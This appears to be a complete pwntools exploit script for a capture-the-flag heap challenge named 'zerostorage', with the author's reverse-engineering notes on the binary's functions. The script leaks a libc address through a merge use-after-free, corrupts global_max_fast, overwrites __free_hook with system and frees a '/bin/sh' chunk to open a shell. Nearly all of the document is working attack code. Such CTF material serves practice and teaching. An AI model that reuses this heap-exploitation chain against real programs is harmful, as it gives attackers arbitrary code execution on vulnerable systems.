#!/usr/bin/env python3

from pwn import *

exe = ELF("./zerostorage")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.19.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def insert(size, data):
    	r.sendline("1")
    	r.sendline(str(size))
    	r.send(data)

    def update(idx, size, data):
    	r.sendline("2")
    	r.sendline(str(idx))
    	r.sendline(str(size))
    	r.send(data)

    def merge (src, dest):
    	r.sendline("3")
    	r.sendline(str(src))
    	r.sendline(str(dest))

    def delete(idx):
    	r.sendline("4")
    	r.sendline(str(idx))

    def view(idx):
    	r.sendline("5")
    	r.sendline(str(idx))

    insert(0x20, "A" * 0x20) # 0
    insert(0xf8, "B" * 0xf8) # 1
    merge(0, 0) # 2
    view(2)

    leak = u64(r.recvuntil("A" * 0x30)[-56:-48])
    libc.address = leak - 0x3be7b8
    
    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 
    log.info("__free_hook address: {}".format(hex(libc.symbols['__free_hook']))) 
    log.info("global_max_fast address: {}".format(hex(libc.symbols['global_max_fast'])))

    update(2, 0x20, "A" * 0x8 + p64(libc.symbols['global_max_fast'] - 0x10) + "A" * 0x10)
    insert(0x20, "/bin/sh\x00" + "C" * (0x20-8)) # 0

    merge(1, 1) # 3

    return_2hook = libc.symbols['__free_hook'] - 0x69
    update(3, 0x200 - 0x10, p64(return_2hook) + "D" * (0x200-0x10-8))
    insert(0x200-0x10, "E" * (0x200-0x10)) # 1
    insert(0x200-0x10, "\x00" * 0x59 + p64(libc.symbols['system']) + "\x00" * (0x200-0x10-0x59-8))
    #gdb.attach(r)
    delete(0)
    r.interactive()


if __name__ == "__main__":
    main()
'''
insert
	- size has to be between 0x80 and 0x1000. If not, defaults first to 0x1000 then 0x80
	- calloc
	- wrong read size - iVar3 funkySize
	-   (&DAT_00303060)[intIdx * 6] = 1;
        (&DAT_00303068)[intIdx * 3] = (long)iVar3; // iVar3 funkySize
        *(ulong *)(&DAT_00303070 + intIdx * 0x18) = uVar4; // uVar4 = (ulong)chunk ^ DAT_00303048;
	
	- 	DAT_00303040 = DAT_00303040 + 1; // count entries 
	    idx = idx + 1;
    	piVar2 = piVar2 + 6;
	
	- 0x20 allocs


update
	- asks for size
	- compares funkySize to another funkySize?
		- if not equal - realloc with iVar1
		- if equal - readFunky with iVar3
	- saves weird chunk ptr again (in case it's different because of realloc) 
	- saves funkySize

merge
	- at least 2 entries
	- checks that entry1&2 has 1 (inuse)
	- compares sumFunky and funkySize2 - no upper check limit?, just min 0x80
		- if not equal - realloc
	- memcpy starting from end of entry2 writes entry1 with funkySize1 - uses our lamesizes!!!!!!!!
	- new idx
	- saves mangles ptr, inuse, sumFunky, 
	- sets inuse and funkySize of entry1 to zero and frees it, the sets ptr to 0
	- does the same but doesnt free entry2?

	- possible wrong mark as free?
	- DAT_00303040 = DAT_00303040 - 1

delete
	- sets inuse, size to 0
	- DAT_00303040 = DAT_00303040 - 1
	- frees then sets to 0

view
	- prints with funky size

realloc frees -> puts in unsorted bin

- the small funkySize helps manipulate realloc
- realloc doesnt clear
'''